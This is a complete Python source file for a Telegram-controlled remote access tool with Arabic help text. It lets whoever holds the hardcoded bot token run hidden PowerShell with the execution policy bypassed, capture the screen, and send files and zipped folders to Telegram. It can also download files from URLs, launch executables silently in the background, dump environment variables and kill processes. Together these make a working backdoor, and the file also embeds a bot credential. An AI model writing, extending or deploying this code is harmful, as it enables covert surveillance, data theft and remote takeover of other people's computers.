import os
import io
import sys
import zipfile
import shutil
import hashlib
import platform
import getpass
import subprocess
import socket
import requests
import psutil
from datetime import datetime
from pathlib import Path
from PIL import ImageGrab

from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, ContextTypes, filters

# =========================
# CONFIG
# =========================
BOT_TOKEN = "8597855802:AAHFpHYqqHg2_NPhUm4DpPF7_iOAoWzczOc"
AUTHORIZED_CHAT_ID = 6693150100
CURRENT_DIR = Path.cwd()
CREATE_NO_WINDOW = 0x08000000
RUNNING_PROCESSES = {}  # name -> PID

# =========================
# UTILS
# =========================
def safe_path(p: str) -> Path:
    return (CURRENT_DIR / p).resolve()

def sha256(file: Path):
    h = hashlib.sha256()
    with open(file, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()

def zip_folder(src: Path, zip_name: Path):
    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(src):
            for f in files:
                full = Path(root) / f
                z.write(full, full.relative_to(src))

def run_powershell_once(command: str) -> str:
    """
    Runs a single PowerShell command in a temporary, hidden session
    and returns stdout/stderr as text.
    """
    try:
        result = subprocess.run(
            [
                "powershell",
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy", "Bypass",
                "-Command", command
            ],
            capture_output=True,
            text=True,
            creationflags=CREATE_NO_WINDOW
        )

        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            output += "\n[stderr]\n" + result.stderr

        return output.strip() or "✔ Command executed (no output)"

    except Exception as e:
        return f"❌ PowerShell error: {e}"


# =========================
# HELP TEXT
# =========================
HELP_TEXT = """
📁 FILE SYSTEM
pwd                     → عرض المسار الحالي
ls [size|img]            → عرض الملفات (حسب الحجم / الصور)
cd <dir>                 → تغيير المجلد
mkdir <dir>              → إنشاء مجلد
touch <file>             → إنشاء ملف
rm <file>                → حذف ملف
rmdir <dir>              → حذف مجلد
copy <src> <dst>         → نسخ
move <src> <dst>         → نقل
rename <old> <new>       → إعادة تسمية
size <file>              → حجم الملف
find <pattern>           → البحث

📄 FILE
cat <file>               → عرض محتوى ملف
preview <file> <n>       → أول n أسطر
hash <file>              → SHA256


▶ RUN
run <file>               → تشغيل ملف حسب نوعه
أمثلة:
run test.py              → python test.py
run app.exe              → تشغيل exe
run tool.zip             → فك الضغط ثم التشغيل


▶ RUN
stop <file>               → توقيف ملف حسب نوعه
أمثلة:
stop test.py              → Ctrl + C =>python test.py
stop app.exe              → توقيف exe



📤📥 TRANSFER
get <file>               → إرسال ملف إلى Telegram
getdir <dir>             → ضغط مجلد + إرساله
download <url> <dst>     → تحميل من الإنترنت
git get <repo_url> <dst> → تحميل GitHub repo

🖥 SYSTEM
whoami
uname
uptime
ip
env
process list
process kill <pid>

🖼 SCREEN
screenshot               → لقطة شاشة

📌 مثال:
download https://example.com/a.txt a.txt
get app.py
getdir test-osint
"""

# =========================
# COMMAND ENGINE
# =========================
def execute_command(cmd: str):
    global CURRENT_DIR
    out = io.StringIO()
    sys.stdout = out

    try:
        parts = cmd.split()
        if not parts:
            return ""

        c, a = parts[0], parts[1:]

        if c == "help":
            print(HELP_TEXT)

        elif c == "pwd":
            print(CURRENT_DIR)

        elif c == "ls":
            items = list(CURRENT_DIR.iterdir())
            if a and a[0] == "size":
                items.sort(key=lambda x: x.stat().st_size)
            elif a and a[0] == "img":
                items = [x for x in items if x.suffix.lower() in (".png", ".jpg", ".jpeg")]
            for i in items:
                print(i.name)

        elif c == "cd":
            if a:
                p = safe_path(a[0])
                if p.exists() and p.is_dir():
                    CURRENT_DIR = p
            print(CURRENT_DIR)

        elif c == "mkdir" and a:
            safe_path(a[0]).mkdir(parents=True, exist_ok=True)

        elif c == "touch" and a:
            safe_path(a[0]).touch(exist_ok=True)

        elif c == "rm" and a:
            p = safe_path(a[0])
            if p.is_file():
                p.unlink()

        elif c == "rmdir" and a:
            shutil.rmtree(safe_path(a[0]), ignore_errors=True)

        elif c == "copy" and len(a) == 2:
            s, d = safe_path(a[0]), safe_path(a[1])
            shutil.copytree(s, d) if s.is_dir() else shutil.copy(s, d)

        elif c == "move" and len(a) == 2:
            shutil.move(safe_path(a[0]), safe_path(a[1]))

        elif c == "rename" and len(a) == 2:
            safe_path(a[0]).rename(safe_path(a[1]))

        elif c == "size" and a:
            print(safe_path(a[0]).stat().st_size, "bytes")

        elif c == "find" and a:
            for p in CURRENT_DIR.rglob(a[0]):
                print(p)

        elif c == "cat" and a:
            print(safe_path(a[0]).read_text(errors="ignore"))

        elif c == "preview" and len(a) == 2:
            lines = safe_path(a[0]).read_text(errors="ignore").splitlines()
            print("\n".join(lines[:int(a[1])]))

        elif c == "hash" and a:
            print(sha256(safe_path(a[0])))

        elif c == "whoami":
            print(getpass.getuser())

        elif c == "uname":
            print(platform.platform())

        elif c == "uptime":
            print(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))

        elif c == "ip":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            print(s.getsockname()[0])
            s.close()

        elif c == "env":
            for k, v in os.environ.items():
                print(f"{k}={v}")

        elif c == "process" and a:
            if a[0] == "list":
                for p in psutil.process_iter(['pid', 'name']):
                    print(p.info)
            elif a[0] == "kill" and len(a) == 2:
                psutil.Process(int(a[1])).kill()

        else:
            print("❌ Unknown command")

    except Exception as e:
        print("Error:", e)
    finally:
        sys.stdout = sys.__stdout__

    return out.getvalue()

# =========================
# TELEGRAM HANDLER
# =========================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    # ---------- RECEIVE FILE ----------
    if update.message.document:
        doc = update.message.document
        file = await doc.get_file()
        path = CURRENT_DIR / doc.file_name
        await file.download_to_drive(path)
        await update.message.reply_text(f"📥 Uploaded → {path}")
        return

    if not update.message.text:
        return

    text = update.message.text.strip().lstrip("/")
    # ---------- EXIT BOT ----------
    if text.lower() == "exit":
        await update.message.reply_text("🛑 Bot shutting down...")
        
        # إيقاف event loop الخاص بالبوت
        await context.application.stop()
        await context.application.shutdown()

        # إنهاء عملية Python نهائيًا
        os._exit(0)

    parts = text.split()
    cmd, args = parts[0], parts[1:]

    # ---------- GET FILE ----------
    if cmd == "get" and args:
        p = safe_path(args[0])
        if p.exists() and p.is_file():
            await update.message.reply_document(p.open("rb"))
        else:
            await update.message.reply_text("❌ File not found")
        return

    # ---------- GET DIR ----------
    if cmd == "getdir" and args:
        d = safe_path(args[0])
        if d.exists() and d.is_dir():
            zip_name = CURRENT_DIR / f"{d.name}.zip"
            zip_folder(d, zip_name)
            await update.message.reply_document(zip_name.open("rb"))
            zip_name.unlink()
        else:
            await update.message.reply_text("❌ Directory not found")
        return

    # ---------- DOWNLOAD ----------
    if cmd == "download" and len(args) == 2:
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            r = requests.get(args[0], headers=headers, timeout=30)
            r.raise_for_status()
            p = safe_path(args[1])
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(r.content)
            await update.message.reply_text(f"⬇ Downloaded → {p}")
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {e}")
        return

    # ---------- GIT ----------
    if cmd == "git" and len(args) == 3 and args[0] == "get":
        repo, dst = args[1], safe_path(args[2])
        dst.mkdir(parents=True, exist_ok=True)
        for branch in ("main", "master"):
            try:
                url = f"{repo.rstrip('/')}/archive/refs/heads/{branch}.zip"
                r = requests.get(url, timeout=30)
                r.raise_for_status()
                z = CURRENT_DIR / "repo.zip"
                z.write_bytes(r.content)
                zipfile.ZipFile(z).extractall(dst)
                z.unlink()
                await update.message.reply_text(f"📦 Repo extracted ({branch}) → {dst}")
                return
            except:
                continue
        await update.message.reply_text("❌ Git failed (no main/master)")

        return

    # ---------- SCREENSHOT ----------
    if cmd == "screenshot":
        name = CURRENT_DIR / f"screen_{datetime.now():%H%M%S}.png"
        ImageGrab.grab().save(name)
        await update.message.reply_photo(name.open("rb"))
        name.unlink()
        return

    # ---------- RUN (NON-BLOCKING / BACKGROUND) ----------
    if cmd == "run" and args:
        try:
            target = safe_path(args[0])

            if not target.exists():
                await update.message.reply_text("❌ File not found")
                return

            # ---------- PYTHON (BACKGROUND, NO WINDOW) ----------
            if target.suffix == ".py":
                p = subprocess.Popen(
                    [sys.executable, str(target)],
                    cwd=target.parent,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=CREATE_NO_WINDOW
                )
                RUNNING_PROCESSES[target.name] = p.pid
                await update.message.reply_text(f"🐍 Python running in background → {target.name} (PID {p.pid})")
                return

            # ---------- ZIP (EXTRACT + RUN EXE IN BACKGROUND) ----------
            if target.suffix == ".zip":
                extract_dir = target.with_suffix("")
                extract_dir.mkdir(exist_ok=True)

                zipfile.ZipFile(target).extractall(extract_dir)

                for exe in extract_dir.rglob("*.exe"):
                    p = subprocess.Popen(
                        str(exe),
                        cwd=exe.parent,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        creationflags=CREATE_NO_WINDOW
                    )
                    RUNNING_PROCESSES[exe.name] = p.pid
                    await update.message.reply_text(f"📦 Extracted & running in background → {exe.name} (PID {p.pid})")
                    return

                await update.message.reply_text("📦 Extracted but no executable found")
                return

            # ---------- EXE / OTHER FILES ----------
            p = subprocess.Popen(
                str(target),
                cwd=target.parent,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=CREATE_NO_WINDOW
            )
            RUNNING_PROCESSES[target.name] = p.pid
            await update.message.reply_text(f"▶ Running in background → {target.name} (PID {p.pid})")

        except Exception as e:
            await update.message.reply_text(f"❌ Run failed: {e}")

        return

    # ---------- STOP ----------
    if cmd == "stop" and args:
        name = args[0]
        pid = RUNNING_PROCESSES.get(name)

        if not pid:
            await update.message.reply_text("❌ Process not found")
            return

        try:
            psutil.Process(pid).terminate()
            del RUNNING_PROCESSES[name]
            await update.message.reply_text(f"🛑 Stopped → {name}")
        except Exception as e:
            await update.message.reply_text(f"❌ Stop failed: {e}")
        return

    # ---------- RUNS ----------
    if cmd == "runs":
        if not RUNNING_PROCESSES:
            await update.message.reply_text("ℹ No running processes")
            return

        msg = "\n".join(f"{k} → PID {v}" for k, v in RUNNING_PROCESSES.items())
        await update.message.reply_text(msg)
        return
    
    # ---------- POWERSHELL (ONE-SHOT) ----------
    if cmd == "ps" and args:
        ps_command = " ".join(args)
        output = run_powershell_once(ps_command)
        await update.message.reply_text(output[:4000])
        return



    result = execute_command(text)
    await update.message.reply_text(result[:4000] or "✔ Done")

# =========================
# MAIN
# =========================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.ALL, handle_message))
    app.run_polling()

if __name__ == "__main__":
    main()
